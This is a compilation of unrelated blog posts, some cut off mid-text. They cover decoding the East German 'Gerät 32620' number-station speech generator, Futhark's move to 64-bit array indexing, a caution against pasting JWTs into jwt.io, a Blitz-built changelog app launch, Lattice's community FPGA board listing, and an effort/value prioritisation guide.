    <p>A few years ago, I first stumbled over some recordings of number stations and started reading up on their history. For most of them, we have pretty good guesses who ran them and for what purpose. One example is the <a href="https://www.youtube.com/watch?v=wxlrnAC7Y7Q">Gongs and Chimes Station</a>, known for its melody that got increasingly creepy over the years, the more worn down the tape got. What always seemed mysterious to me is the kinds of devices used to actually generate the spoken messages. Were they similar to electromechanical devices used for time announcements over the telephone, <a href="https://youtu.be/4aMqKr0D-7o?t=47">with multiple play heads</a> or <a href="https://www.youtube.com/watch?v=lESMfh72RJg">complicated tape mechanisms</a>?</p>
<p>Then, I stumbled over <a href="https://www.youtube.com/watch?v=4buFLqjvTjA">this video</a>. And... It's <em>the actual voice</em> used by the <em>Gongs and Chimes</em> Station? What surprised me was how rather small, polished and complex the machine seemed. There definitely was a microcontroller in there, it had an LED display, and just in general seemed like a rather fancy device.</p>

    </p>
    
</div>

<div>
    <p>The most important thing however was, I finally knew what to look for. Searching for "Sprach-Morse-Generator" (Speech-Morse-Generator) quickly got me to <a href="https://www.cryptomuseum.com/spy/owvl/32620/index.htm">a page about it at the crypto museum</a> which also mentions its official name: "Gerät 32620" (Device 32620). The page also has some great information about the history of the device and the voice behind it.</p>
<p>What exited me the most was... There are actually links to technical documentation about the Speech generator and its companion device, Gerät 32621, which could be used for digitizing voice recordings and writing them to EPROM cartridges to use with Gerät 32620.</p>

</div>

<div>
    <h3><a href="https://www.cryptomuseum.com/spy/owvl/32620/files/MfS_OTS_4061.pdf">The 32620 Guide</a></h3>
<p>I don't want to go over everything mentioned in these guides; if you speak German I'd recommend giving it a read yourself; but I do want to mention some things I found notable.</p>
<p>As input, either paper punch tapes, the keyboard, or a serial interface (RS-232) can be used. The last one is a bit unclear, it is mentioned in the beginning, but later parts of the document mention it as a possible future addition. Either way, the messages are transferred to RAM, from where they can later be transmitted. It can hold up to 3791 characters.</p>
<p>The language samples are loaded from an exchangeable cartridge which can hold up to 96 kByte, where they are stored as uncompressed <a href="https://en.wikipedia.org/wiki/Pulse-code_modulation">PCM</a> . They proudly mention the cartridges can be swapped in 10 seconds.</p>

    </p>
    <p>The number of words per minute and pitch of the voice can be varied, which explains why some recordings of number stations with the same voice sound a bit different.</p>

    </p>
    
</div>

<p>What I find quite surprising: The keyboard and output of the device mostly uses English words. A bit unexpected for a device developed in eastern Germany for use in the Soviet Union; I would rather have expected Russian there.</p>

<div>

    </p>
    <p>There are some pretty charming charts in the documentation showing some interactions with the device.</p>

    </p>
    <p>On the back are a speaker, output to the transmitter and some status outputs and remote control inputs. These were probably used so the chimes and speech wouldn't overlap.</p>
</div>

<p>There are also pretty detailed schematic drawings and lists of component at the end of the document.</p>

<div>
    <h3><a href="https://www.cryptomuseum.com/spy/owvl/32620/files/MfS_OTS_4062b.pdf">The 32621 Guide</a></h3>
<p>This is the companion device used for digitizing voices and writing them to cartridges for the 32620. It's quite astounding how complicated this device really is: It can either record words separately or all of them in one go, it automatically recognizes the beginning and end of the words, it can duplicate cartridges and it even has a UV chamber for clearing the EEPROMS on a cartridge to reuse it.</p>
<p>What's interesting: There are no photos of this device. It's unclear how many were produced, there may just have been one or two. The only things we know about it are from this document.</p>
<p>In its architecture, it is quite similar to the 32620, it has a very similar keyboard and probably the same display.</p>

</div>

<div>
    <p>One interesting difference: It uses German labels on the keyboard. Also, all of the text it shows on the display is in German.</p>
    <p><img src="https://blog.ardy.io/2020/8/geraet-32620/tastatur2.png" alt=""> 
    </p>
    
</div>

<div>
    <p>The documentation mentions recording up to 20 words. This also came up in the 32620's documentation, although only 13 words were ever used: digits 0-9, "Achtung" (Attention), "Trennung" (Seperation) and "Ende" (End).</p>
<p>It has controls for adjusting the 0-level of the recordings and amplification. LEDs show whether it senses an audio signal and whether it's clipping. The amplification for single words can also be adjusted later, from a value of 0 to 7. It seems like this doesn't actually change the recorded samples but controls the amplification level in the digital to analogue converter. This feature is intended for making all the digits similar in volume.</p>
<p>I find this a bit surprising, all of this is something that could be done with other equipment, especially since only two different voices for these machines are known: German and Spanish.</p>
<p>In order to check the recording, either all recorded digits or just combinations of them can be played back.</p>
<p>When programming to an EPROM, it transfers the start address and amplification for each word and the samples from RAM to the ROM and checks whether the values it reads back after programming are as expected.</p>

</div>

<p>There is a separate mode for deleting cartridges where the time to expose them to UV can be typed in via the keyboard. If the rom cartridge is double sided, the cartridge has to be turned around to delete the chips on the other side.</p>

    <p>For all of the different modes of the 32621, flow charts for the interface are provided.</p>

    <p>The front also features various other indicators, e.g. for the different voltages in the device.</p>
</div>

<p>This manual also includes schematics for the device.</p>

<div>
    <h3>The EPROMS</h3>
<p>The crypto museum also provides dumps of the EPROMS for both the German and Spanish cartridges.</p>
<p>Having read the manuals, decoding them is actually not that hard: The data is stored as PCM, and the 32621 Guide mentions the time between samples is 125μs, which adds up to a sample rate of 8000Hz.
Loading the roms into Audacity with File&gt;Import&gt;Raw Data, you can actually already listen to them!</p>
<p>[Edit: Here are the dumps as WAVs, if you're interested: <a href="https://blog.ardy.io/2020/8/geraet-32620/2620_ger.wav">german</a>, <a href="https://blog.ardy.io/2020/8/geraet-32620/2620_span.wav">spanish</a>]</p>
<h4>The Header</h4>
<p>In the very beginning of the first EPROM, there are 64 byte of header information, containing the start address for each word and its amplification factor. For 20 words, that leaves just over 3 bytes per word, although they seem to just stick to 3.</p>
<p>Decoding the rest of the header took a lot longer than anticipated. I found the 3 bits for the amplification value pretty quickly in the last byte for each word. The rest somehow had to be the start address or some offset, and possibly the length. For accessing the values in each of the 8K chips, 13 Bits for the address are needed. To select one of the up to 12 EPROMs, another 4 Bit are required. This adds up to 17 Bits, so one more than in two bytes.</p>
<p>To get around this, there are two obvious solutions: Stuff the one extra bit into the byte which holds the amplification level, or throw away the least significant bit for the start address, so just every other sample can be used as the start sample.</p>
<p>Two things made this really hard to pin down: The z80 is a <a href="https://en.wikipedia.org/wiki/Endianness">little endian machine</a>, meaning for 16 bit values, the less significant byte is stored before the more significant byte, but this doesn't mean they would <em>have</em> to store the values in this order. Also, the binary chip select value for the first EPROM isn't 0, but 2. I only stumbled upon that when looking at the schematic for the EPROM cartridge (p. 38 in the 32620 manual). There's also a really cute demultiplexer built from discrete AND and NAND gates for translating the chip address to the actual chip select lines!</p>

</div>

<div>
    <p>Isn't it gorgeous! Note how it only <em>suggests</em> the presence of the fourth address line for the chip select with that not connected NAND.</p>
    <p><img src="https://blog.ardy.io/2020/8/geraet-32620/demux.png" alt="The schematic for the demultiplexer built out of discreet components."> 
    </p>
    
</div>

<div>
    <p>My best guess to why is the case is the chip select address values 0 and 1 are already used to select some other components. But, at last, I think I found out how it works:</p>
<p>For each word, the second byte contains the 3 least significant bits for the chip select and 5 of the address bits. The first byte contains the remaining 8 address bits. The end of each word is the beginning address for the next word. That's why there are two extra bytes after the last word. This would have worked for up to twenty words, as there would still be 4 spare bytes to contain the end address of the last word. The third byte contains the remaining chip select bit, some mysterious bits, and 3 bits for the amplification level.</p>
<p>The remaining chip select bit is still a bit confusing to me: The German recordings don't use it, since they fit on just 6 EPROMs. The Spanish one has to use it for the last two words, but there's something odd happening with the values in the one before the last two words.</p>
<p>Another thing worth noting: The German words all use the default amplification level of 3, whereas the Spanish ones use lower and higher values for some words. To be <em>really</em> authentic, you'd have to take that into account when playing the samples.</p>
<p>One last thing I was interested in: The Spanish voice uses the same word for "Trennung" and "Ende"&amp;em;"final", and they sure <em>sound</em> the same. So, is …</p></div></div></div></div>

<p>
    Posted on September  1, 2020
    
        by Troels Henriksen
    
</p>

<p>We try to make each new version of the Futhark compiler faster than the last. While <a href="https://futhark-lang.org/blog/2020-07-01-is-futhark-getting-faster-or-slower.html">we sometimes make mistakes</a>, the the long-term trend is pretty good. Yesterday, however, we made a change that flat out makes some programs slower, without fixing any bugs. This post will serve as a bit of catharsis, and detail some of the less enjoyable parts of compiler development.</p>
<p>One of the <a href="https://futhark-lang.org/blog/2019-12-18-design-flaws-in-futhark.html">early design flaws in Futhark</a> is that all array sizes are 32 bit signed integers. This limits each array dimension to about two billion elements. Further, since the memory address space is ultimately one-dimensional (<a href="https://en.wikipedia.org/wiki/Non-uniform_memory_access">NUMA</a> shenanigans notwithstanding), we must flatten multi-dimensional array indexing to a one-dimensional offset. If <code>A</code> is an array of type <code>[n][m]i32</code> in <a href="https://en.wikipedia.org/wiki/Row-_and_column-major_order">row-major form</a>, then the index expression <code>A[i,j]</code> will be flattened to <code>A[i*m+j]</code>. In Futhark, this multiplication and addition was done with 32-bit signed integers, which limited the <em>total size in bytes</em> of multi-dimensional arrays to 2GiB. This size restriction has not been a big problem in practice, as our main code generation target (GPUs) is fairly memory-constrained, so it is rare to have single arrays that are this large. But GPU memory banks are growing every year, so this <em>will</em> be a problem soon. Further, <a href="https://github.com/HnimNart/">Minh Duc Tran</a> is currently finishing up development on a multicore CPU code generation backend, which will make Futhark useful on more than just GPUs. On a CPU, an array larger than 2GiB is not exceptional. Therefore, we changed the code generator to use 64-bit integers when computing flat offsets when generating array indexes. This is just the initial step, and does not truly allow large arrays yet, but it’s a good place to start, and to begin to understand the performance ramifications.</p>
<p>So what are these performance ramifications? While 64-bit arithmetic operations possibly takes a little longer to perform, that’s not the concern. The main problem is that they require more <em>registers</em>. A modern GPU consists of what NVIDIA calls <a href="https://fabiensanglard.net/cuda/">streaming multiprocessors (SMs)</a>. Other vendors have a similar design, but a different name. Each SM can run many threads (hundreds to thousands), which all share the same <em>register bank</em>. An NVIDIA RTX 2080 Ti has 256KiB of registers on every SM. Each GPU thread is allotted a portion of this register bank. The size of this portion remains unchanged throughout the run-time of the thread, but can be set when the thread is first launched. This is different from CPUs, where the amount of registers available to a thread is an unchangeable hardware detail. However, the more registers each GPU thread needs, the fewer threads will be able to run at the same time. If a GPU thread needs too many registers, a compiler can perform <a href="https://en.wikipedia.org/wiki/Register_allocation">spilling</a>, where register contents are temporarily copied to memory and recovered later. This is exactly the same idea as on a CPU, but where CPU code can spill to the stack, which is readily cached using the deep and sophisticated cache hierarchy of a modern CPU, spilling to memory on a GPU can be quite expensive. This means that <em>register pressure</em> is a significant concern for GPU code, with sudden and somewhat unpredictable performance cliffs. Spilling is normally under the control of the GPU kernel compiler, which translates C-like GPU code to GPU machine code, but with some ability for the programmer to influence its behaviour.</p>
<p>Changing the array indexing code to use 64-bit integers will increase register pressure, which can (and does) have negative performance implications, but the details are highly sensitive to what else is happening in the program. Perhaps other parts are already register-hungry enough that the overall usage remains unchanged. The overall impact on Futhark-generated is difficult to quantify. While we have <a href="https://futhark.readthedocs.io/en/latest/man/futhark-bench.html">decent tools for reproducible benchmarking</a>, our setup is not statistically robust enough to measure tiny fluctuations of a percent or two, which is in most cases the impact I would expect to see. But for a few programs, the impact of using 64-bit address calculations looks more significant.</p>
<p>One is <a href="https://github.com/diku-dk/futhark-benchmarks/blob/master/finpar/OptionPricing.fut">OptionPricing</a>, which for its largest dataset suffers a 23% slowdown on our NVIDIA RTX 2080 Ti GPU. I did some investigation, and indeed the register usage of its single (very large) GPU kernel has gone up slightly. But here’s the interesting thing: <em>the slowdown only appears with the OpenCL backend</em>. With Futhark’s CUDA backend, there is no performance change! I did a little bit of investigation into how the two backends differ in the <a href="https://docs.nvidia.com/cuda/parallel-thread-execution/index.html">PTX</a> (virtual NVIDIA GPU machine code) they cause to be generated, and it appears the OpenCL compiler is keeping certain 64-bit values around in registers for longer periods of time, while the CUDA compiler is more aggressive about recomputing them when needed. This is beyond what the Futhark compiler has any control over, which is a bit frustrating. I thought that NVIDIAs OpenCL and CUDA implementations where merely different front-ends to the same backend compiler, so I’m not sure why they would differ here. A similar phenomenon occurs for a few other benchmark programs.</p>
<p>Overall, there is no doubt that using 64-bit indexing slows down the generated code - it only becomes a question of how much. Perhaps we can recover some of the lost performance by various micro-optimisations, or passing different options to the GPU vendor compilers that ultimately generate the machine code. But at the end of the day, we are getting slower because we are doing more work with bigger data, and that has a cost. That cost will only increase as we gradually convert more of the compiler to use 64-bit sizes and indexes. This <em>sucks</em>, and has no immediate payoff, as all of our current workloads <em>fit</em> in 32 bits! But this is ultimately the right thing to do. However, I hope that the multicore CPU backend will allow someone to write a fun and motivating program that uses huge arrays, just so this work doesn’t feel exclusively like a slowdown for no practical advantage.</p>

All of these examples are referencing Non-Production examples.</p><p>I also want to caveat this with the fact that this is <strong>not a personal attack</strong> on jwt.io. I am using them as an example as they're a well-known and well-used service, and I've seen issues with it before. Auth0 run it, and are probably one of the few companies we'd want to be running it. It's also <a href="https://github.com/jsonwebtoken/jsonwebtoken.github.io">Open Source</a> <em>but</em> one of the great difficulties of Web-hosted services are that we have no idea if the source code that we're told is being used is actually being used!</p><p>I'm currently working on the Open Banking platform for Capital One. We're fortunate to have very restricted access to Production, which makes things safer for everyone. One thing we strive to do is to treat Non-Production secrets like Production ones where possible - where we shouldn't have access to them at all, and shouldn't be sharing them with external services. Some of these Non-Production secrets may be usable outside of Capital One, for instance Open Banking Sandbox signing certificates.</p><p>We perform a fair bit of testing in our Non-Production environments and sometimes need to debug things, such as what's inside a JWT (as Open Banking introduces several places they're used). I've been burned a number of times by folks putting a Non-Production JWT or an Open Banking Sandbox certificate into jwt.io. Although Non-Production, these are sensitive in of themselves, as they have implementation details for our services, and as mentioned, certain things could be used outside of Capital One.</p><p>The biggest reason I hear from folks using online tooling is that it's easier, and that they'd rather do that than find out how to run it locally. I disagree with this, but am quite biased, as I often have a blog post for many of these common issues. I love sharing my blog with others and having a handy solution, or if I don't have an answer to a problem, I'll find out how and <a href="https://www.jvt.me/tags/blogumentation/">blogument it for later</a>. So I see that reaching for online tooling is more just because we've got folks who aren't aware of how they could do otherwise.</p><p>One great thing about removing the need for an online tool is that you can self-serve it once you have the tools locally. You can run it locally when you've got no internet (which isn't as much of an issue in these Coronavirus times) but also regardless of whether the upstream service is broken. You can use it with other i.e. command-line tooling, for instance how I've set up <a href="https://gitlab.com/jamietanna/dotfiles-arch/-/blob/master/terminal/home/bin/unpack">this command-line script</a> to handle a lot of common data formats I deal with and unpack them to a human-readable format.</p><p>But most importantly, by telling people to put sensitive data (such as credentials, configuration files, etc) it's a really dangerous lesson for our teams. We're teaching people to blindly trust arbitrary websites that they don't have any relationship with, nor have fully audited the source code, when posting potentially sensitive data.</p><p>I realise this may not be something you do when running it locally, but it's less likely for a well-known library running locally to need to reach outbound.</p><p>jwt.io is an interesting example, because although it boasts that it runs as a client-side solution, you may not have been aware that <a href="https://github.com/jsonwebtoken/jsonwebtoken.github.io/commit/b362ab19a9f37e337b5f8ea38987aa680aa6e0a9">until last September</a>, there were metrics being determined which although may have seemed innocent, show that it's easy for other functionality to be hidden in a seemingly client-side-only website. Unless you audit everything, every time, you're in a risky position where you may be leaking data you're not expecting to.</p><p>I feel that we can do something to help services that handle potentially sensitive data with helping educate the user that they should be more careful, because jwt.io's warning definitely doesn't help with folks who don't fully appreciate what the risk is if jwt.io isn't actually as trustworthy as the user thinks:</p><blockquote><p>Warning: JWTs are credentials, which can grant access to resources. Be careful where you paste them! We do not record tokens, all validation and debugging is done on the client side.</p></blockquote><p>What do you think? Am I maybe being a little too sensitive? Am I not being sensitive enough?</p><p>Edit: Based on some conversations being had in response to the post, I thought it'd mention I've written about how to <a href="https://www.jvt.me/posts/2019/06/13/pretty-printing-jwt-openssl/">pretty-print a JWT locally with OpenSSL</a> and <a href="https://www.jvt.me/posts/2018/08/31/pretty-printing-jwt-ruby/">a Ruby alternative</a>.</p></div></div>]]>

September 1, 2020 | https://kitze.io/posts/launching-fungarzione-with-blitz | <a href="https://web.archive.org/web/*/https://kitze.io/posts/launching-fungarzione-with-blitz">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>You already know that I'm pretty frustrated with the way we do things on the web. In order to fetch a list of things and display them as rectangles on a webpage, we need to jump through 1938137 hoops. What is this, Circus Charlie? Anyone? Remember that game??? I'm old 😭</p>&nbsp;<h2>The problem with our current stack</h2><p>The process of making a web app is so unnecessarily complex and so many people are going for a SPA even when it's not needed. GraphQL makes working with an API easy, but it still involves building that API, and writing a lot of boilerplate. You might not mind all of that until someone removes the layer for you. And that's <a href="https://blitzjs.com/" target="_blank" rel="noopener noreferrer">Blitz</a>.</p>&nbsp;<p>"Damn, I just want to fetch some data directly from the database and display it!" - You, probably</p>&nbsp;<p>"You can do that with PHP and raw SQL..." - Someone on HN, probably</p>&nbsp;<p>"LMAO" - You</p>&nbsp;<p>"Well, why don't you use Rails?" - Someone on Reddit, probably</p>&nbsp;<p>"I only know JavaScript and I want to use React" - You, probably</p>&nbsp;<p>"Welp, too bad there's nothing similar to Rails in the React world..." - Someone on Twitter, probably</p>&nbsp;<p>"Hey, what if there was a Fullstack React framework, similar to Ruby on Rails?" - Blitz, if it could talk, probably</p>&nbsp;<p><em>Meteor crying in the corner, probably</em></p>&nbsp;<h2>What is Blitz?</h2><p>Blitz "removes" the API layer in a very clever way so you can directly call functions from your backend, which completely changes the game. Actually, this is not the best way to describe what it does, so you better <a href="https://blitzjs.com/" target="_blank" rel="noopener noreferrer">read the docs</a>. TL;DR: it's magic.</p>&nbsp;<p>What I like about Blitz is that it builds on top of already solid solutions like <a href="https://nextjs.org/" target="_blank" rel="noopener noreferrer">Next.js</a>, <a href="https://react-query.tanstack.com/" target="_blank" rel="noopener noreferrer">react-query</a>, and <a href="https://prisma.io/" target="_blank" rel="noopener noreferrer">Prisma</a>. I already used them in other projects, but I love the way Blitz glues all of them together and it magically works. </p>&nbsp;<p>The ability to get whatever you want directly from the database, with the nicely typed API from Prisma, and then just display it, is a pretty wonderful experience. It makes me feel that for years we had no frickin' clue why we did things the way we did them, until finally someone realized that we don't have to do them that way.</p>&nbsp;<p>When generating a new Blitz app you get all the authentication boilerplate generated for you and I all I have to say is <em>fucking finally</em>.  It's 2020, I don't want to build the authentication layer again, and again, and again, and again. Hey frameworks, just let me get me the current user with <code>const user = useCurrentUser()</code> and don't bother me with anything else.</p>&nbsp;<p>I can't even describe how fast you can ship a product when there is no API layer and boilerplate involved. </p>&nbsp;<p>There are similar frameworks to Blitz which go in a completely different direction by rebuilding most of the stack. Personally, I'm tired of the React community constantly reinventing things that don't need reinventing. Next.js is already amazing, so just imagine how much code we'd be able to reuse if we all agree on using it by default. More reusing, less reinventing, please.</p>&nbsp;<h2>Launching a production app in a few days</h2><p>I already did <a href="https://www.youtube.com/watch?v=RiLYvLNDeKA" target="_blank" rel="noopener noreferrer">two</a> <a href="https://www.youtube.com/watch?v=Qr-7Z9Grvfw" target="_blank" rel="noopener noreferrer">streams</a> with <a href="https://twitter.com/flybayer" target="_blank" rel="noopener noreferrer">Brandon</a>, the creator of Blitz, and I couldn't wait to actually try Blitz on a real project. The problem is, I needed a real project because I didn't want to waste my time on some demo gibberish which is never going to see the light of day.</p>&nbsp;<p>I got frustrated by the app that I was using for writing changelogs for <a href="https://sizzy.co/" target="_blank" rel="noopener noreferrer">Sizzy</a>, so I decided to sit down and write <a href="https://fungarzione.com/sizzy" target="_blank" rel="noopener noreferrer">my own tool</a> with some more advanced features that will make the process easier. </p>&nbsp;<p>I <a href="https://twitch.tv/thekitze" target="_blank" rel="noopener noreferrer">livestreamed the entire process</a> from "hello world" to deployment and I couldn't believe that it only took me only 5 days. </p>&nbsp;<p>Actually, the majority of the work was done in only 2 days, which is crazy. Someone commented "my boss shouldn't see this" on the stream and the credit for that goes to Blitz. You can definitely ship faster than a team of people who would argue about the modeling of the API, raw SQL queries, and whether to use redux-saga or RxJS for fetching the data.</p>&nbsp;<p>Hey Kitze, if you finished most of the things in 2 days, why did it take you 5 days?</p>&nbsp;<p>Great question, reader.</p>&nbsp;<ul><li><svg viewBox="0 0 14 14" focusable="false" role="presentation"><g fill="currentColor"><polygon points="5.5 11.9993304 14 3.49933039 12.5 2 5.5 8.99933039 1.5 4.9968652 0 6.49933039"></polygon></g></svg>Day 3: Polishing the design and adding extra features</li><li><svg viewBox="0 0 14 14" focusable="false" role="presentation"><g fill="currentColor"><polygon points="5.5 11.9993304 14 3.49933039 12.5 2 5.5 8.99933039 1.5 4.9968652 0 6.49933039"></polygon></g></svg>Day 4: Deployment. I deployed the database to DigitalOcean without a problem, but I had a problem with deploying the Blitz app to Vercel. Turns out, the problem wasn't with Blitz or Vercel and it was ... TypeScript. Yup, I couldn't deploy the app because TS was being a pain in the ass, and the Vercel logs didn't show that. I had to dive deep, find the problematic files, and fix everything, so that took most of the day.</li><li><svg viewBox="0 0 14 14" focusable="false" role="presentation"><g fill="currentColor"><polygon points="5.5 11.9993304 14 3.49933039 12.5 2 5.5 8.99933039 1.5 4.9968652 0 6.49933039"></polygon></g></svg>Day 5: CSS. Of course. You can put as many layers as you want on top of CSS, it's still CSS at the end of the day. I literally lost an entire day on centering things and making sure the fixed header and sticky footer layouts work in Safari on iOS. Oh, by the way, fuck Safari. We finally got rid of the pain that's IE pain, but Safari is here to replace it.</li></ul><h2>Why another changelog app?</h2><p>I would never make an app if there wasn't an actual need for it. There are tons of Saas products for making changelogs, but I had something different in mind.</p>&nbsp;<p>I was using a popular solution for writing the Sizzy changelogs for 1.5 years. However, the changelog was a huge markdown document, so we had to use Notion boards to plan the work as individual cards, and then collaborate on them with the Sizzy team. When we were done, we'd export markdown from all the cards and merge them in a giant markdown document. In the past 3 months, I'm working on the changelog alone, so I decided to directly write the giant markdown document. Aside from being an overwhelming experience, I also lost my 3 hours of progress by accidentally closing the tab.</p>&nbsp;<p>So I said: fuck it, I'd rather build a proper changelog app instead of writing this changelog again.</p>&nbsp;<p>I wanted to improve the process of collaborating and publishing a changelog, and in the process, I came up with a bunch of ideas that will hopefully change the changelog game. Wait... was there ever a <em>changelog game</em>? If not, there is now. Boom 🎤</p>&nbsp;<p>Wait, the mic should actually drop.</p>&nbsp;<p>🎤  </p>&nbsp;<p>There.</p>&nbsp;<h2>Introducing <a href="https://fungarzione.com/" target="_blank" rel="noopener noreferrer">Fungarzione</a> - The Changelog Of The Future</h2><p>Instead of publishing a giant markdown document, a team of collaborators would start working on individual entries. The editor supports Markdown, but also MDX, with a set of custom components that would make the changelogs way better. </p>&nbsp;<p>Creating a changelog entry is super simple, and it's not as overwhelming as starting a giant markdown document.</p>&nbsp;&nbsp;<p>Individual entries can then progress from Draft to Ready For Review, to Published. Team collaboration features like assigning people and commenting on the entries will be available when registration is open to everyone.</p>&nbsp;&nbsp;<p>After creating a bunch of entries, a changelog is created by combininig individual entries, as well as adding a list of small bug fixes and improvements, which will appear grouped at the end of the document.</p>&nbsp;&nbsp;<p>Then, the draft changelog is moved to "Ready for Review" and it cannot be published, unless all of the entries in that changelog area already published.</p>&nbsp;&nbsp;<p>Users can leave feedback individually for each changelog, as well as subscribe to get an email when a new changelog is published.</p>&nbsp;&nbsp;<h2>Fungarzione is live</h2><p>I already ported <a href="http://fungarzione.com/sizzy" target="_blank" rel="noopener noreferrer">the last 10 changelogs for Sizzy</a> to Fungarzione and I'm already in love with the publishing experience. It's not that overwhelming and I can work on the changelog in chunks.</p>&nbsp;<p><em>self high-five</em></p>&nbsp;<p>Also, to be honest, even with my mediocre design skills, it already looks better than some of the popular changelog apps out there 🙈 </p>&nbsp;<p><em>taps myself on the back a bit more</em> </p>&nbsp;<p>If you're interested in signing up you can <a href="https://fungarzione.com/" target="_blank" rel="noopener noreferrer">leave your email here</a> and you'll get a notification when public access is available (hopefully soon).</p>&nbsp;<p>I'm also looking for people who'd like to port their changelog <em>now</em>, so I can get some feedback on the editor experience. You just need to have a production app with an established user base, as well as an existing changelog. Just <a href="mailto:kristijan.mkd@gmail.com" target="_blank" rel="noopener noreferrer">shoot me an email</a> and we can discuss.</p>&nbsp;<h2>Conclusion on Blitz</h2><p>I still have to explore Blitz a bit more to figure out all the downsides, but I think that I'd definitely pick Blitz for most of my future apps, unless I have a really specific reason not to. Brandon said there will be a way to reuse the same Blitz client in React Native apps, so you won't miss the actual API layer.</p>&nbsp;<h2>Fungarzione</h2><p>I know what you're thinking right now.</p>&nbsp;<p>Fungarzione?!</p>&nbsp;<p>FUNGARZIONE?!?! What the hell does the name mean, Kitze?</p>&nbsp;<p>Fungarzione comes from the word Fungangarzione. And the origin of Fungangarzione is really a long story, so I guess you'll have to <a href="https://twitch.tv/thekitze" target="_blank" rel="noopener noreferrer">hang out in my stream</a> to find out 😜 I'm planning to live stream the rest of the work on this app, and trust me, there are too way too many things that I'd like to do. If you have any ideas or suggestions you're more welcome to join my stream! 🙌</p>&nbsp;<p>I want to give another shout-out to all the people on Twitch who helped me while I was building this app (even though they're credited in the footer of the page).</p>&nbsp;<p>There's no way I would've shipped it in such a short time without your help 💜</p>&nbsp;</div></div></div></div>]]>

          <p><strong>Field-programmable gate array (FPGA) expert Lattice Semiconductor has embraced the ethos of the open hardware community, creating a portal which lists what the company describes as “community sourced” open hardware development boards and reference designs.</strong></p>
<p>“In addition to proprietary boards developed by Lattice and other partners there is a broad array of boards developed by the open source community,” Lattice notes on its freshly-launched portal. “In some cases just the designs are available and in other cases there are sources available for purchasing assembled boards.</p>
<p>“For your convenience we list some of the more popular and interesting Community Sourced boards on the Lattice website. Lattice does not evaluate or certify community sourced boards so you will want to make your own assessment as to fitness for your application.”</p>
<p>The initial list of boards, all naturally built around Lattice FPGAs, is split into two. The first half showcases development kits and boards, uncluding the recently-launched ECP5-based OrangeCrab, the popular TinyFPGA Bx, iCEBreaker, Fomu, and Alhambra II. The second half looks at reference designs, including an ECP5 board from Matthew Venn, the myStorm BlackIce-II, Dadamachines Doppler, and the unusual earring form-factor iCE Bling from Electronut Labs.</p>
<p>Each board in the list receives a dedicated showcase page which highlights key features, provides imagery, and links out to external homepages, source code and design file repositories, and provides links to where finished boards can be purchased for immediate use.</p>
<p>The full list of boards and reference designs can be found on the <a href="https://www.latticesemi.com/en/Solutions/Solutions/SolutionsDetails01/CommunitySourced">Lattice Semiconductor website</a>; the company has also indicated that it is accepting suggestions for other boards not currently included via a <a href="http://ww3.latticesemi.com/Community_Sourced.html">contact form</a>.</p>

      <p><img src="https://www.subtask.co/uploads/subtask-effort-value-priority-matrix.png" alt=""></p>

<section data-level="1" id="-steps-to-use-an-effort-value-matrix-and-work-more-effectively-with-your-team-">
<p>Software teams today are working hard on a wide variety of interesting, complex, and challenging problems.  Being successful is as much about figuring out the right work to do as it is about doing that work right.  One of the tools that can help your team do this effectively is the effort/value matrix.  An effort/value matrix is simply an adaptation of the urgent/important matrix known as the <a href="https://www.eisenhower.me/eisenhower-matrix/">Eisenhower matrix</a>, which is widely used in decision-making. Whether you’re tasked with developing new features in an app, deciding on your business strategy, trying to hit a goal or KPI, or planning a social media campaign, this method makes it easy to hone in on the right things to spend your time on. </p>
<p>Our team refers to effort/value grids constantly as we improve our suite of products (<a href="https://www.subtask.co/">Subtask</a>, <a href="https://team.video/">Team.Video</a>, and <a href="https://www.plectica.com/">Plectica</a>).  Here is a guide for how to use an effort/value matrix so you can work more effectively with your team on your biggest challenges.</p>

<section data-level="2" id="-get-all-ideas-on-the-table"><h2>1. Get all ideas on the table</h2>
<p>The first thing to do is gather and expose all your available options.  This might be the result of a brainstorming session, it might be a list of requests from various customers or stakeholders, it might just be a to-do list you made.  The important thing is to put it all into a place where  everyone can think explicitly about each of them.  Great ideas can come from anywhere—engineers, CEOs, designers, customers, product managers, customer service representatives, sales associates, etc.  Bring together whoever has input on the specific problem you’re focused on.  You can do this exercise with post-it notes on a whiteboard, or using online software such as <a href="https://www.subtask.co/">Subtask</a>.</p>
<p><img src="https://www.subtask.co/uploads/subtask-example-task-board.png" alt=""></p>

</section>
<section data-level="2" id="-get-different-perspectives-and-discuss-tradeoffs"><h2>2. Get different perspectives and discuss tradeoffs</h2>
<p>Next, it’s time to build the effort/value matrix by discussing the costs and tradeoffs associated with each idea.  This is another part of the process where it’s important to have a variety of different perspectives in the discussion.  </p>
<p>If you’re developing a product roadmap, have an engineer there to speak to the feasibility of an idea, and a product owner to speak to the idea’s value.  Other perspectives can help too, depending on the phase you’re in: sales and marketing, business viability, customer usability, legal or financial constraints, etc.  </p>
<p>The purpose of bringing these perspectives together is to boil it down to a relative measure of Effort and Value.  </p>
<p><strong>Effort</strong> may be defined as the estimated time it might take, the relative complexity, or the number of unknowns.  <strong>Value</strong> may be a combination of market size, expected impact on customer usage, or the capacity for it to enable further work on other ideas.</p>
<p>In the course of the team’s discussion, a customer success manager might note that one item was requested frequently from users and an engineer might estimate that it’s a fairly low amount of work to implement.  As you have these discussions you can begin positioning each item in the effort value matrix.  </p>
<p><img src="https://www.subtask.co/uploads/subtask-effort-value-matrix-in-progress.png" alt=""></p>
<p>It’s ok that estimates are rarely precise.  It’s impossible to know whether a new feature will bring in revenue until customers can actually use it; and it’s impossible to know exactly how long it will take to build that feature until your engineers have dug into the code. But by bringing a number of perspectives together for this exercise, your team can greatly reduce the risk that they’re off target on one particular estimate, or over-indexing on a particular piece of the puzzle.   This helps to ensure that the effort and value measures you’ve assigned are in the right ballpark relative to each other.</p>

</section>
<section data-level="2" id="-recheck-your-assumptions"><h2>3. Recheck your assumptions</h2>
<p>Once you’ve placed each item in the matrix, take stock of how it all looks.  Do all the estimates for effort and value feel honest?  Often we end up with a matrix where it seems like everything was placed in the easy and valuable quadrant (we all like to be hopeful when we’re estimating).  </p>
<p>By doing this exercise in an effort/value matrix, you’re able to easily see this and guard against it.  If you only went through a list of tasks one by one to assigned estimates, and never related them spatially on the effort-value matrix, you’d probably never be aware of the bias your team brings to your planning.  </p>
<p>It’s important as a team to recheck and question assumptions.  Some of those assumptions might be backed by data that’s readily available, other assumptions might be based on experience, and others might just be guesswork.  With the effort/value grid in front of you, these important discussions will happen much more readily.  Is Feature A really less effort than Feature B?  Is Feature C really demanded by users as much as we think?  Is there a lot of uncertainty about how to build Feature D?</p>

